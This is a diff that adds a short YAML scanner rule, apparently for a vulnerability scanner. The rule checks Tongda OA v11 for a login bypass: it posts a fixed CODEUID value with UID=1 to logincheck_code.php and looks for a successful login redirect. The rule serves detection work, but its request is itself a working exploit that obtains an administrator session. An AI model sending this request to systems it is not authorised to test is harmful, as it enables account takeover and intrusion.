@@ -1,0 +1,14 @@
+name: tongda-v11-session-disclosure-login-bypass
+rules:
+  - method: GET
+    path: "/general/login_code.php"
+    expression: |
+      response.status == 200 && response.headers["content-type"].contains("image/png")
+  - method: POST
+    path: "/logincheck_code.php"
+    body: |
+      CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"status":')  && response.body.bcontains(b'"msg":') && response.body.bcontains(b'"url":') && response.body.bcontains(b'index.php?isIE=0')
+detail:
+  author: 666
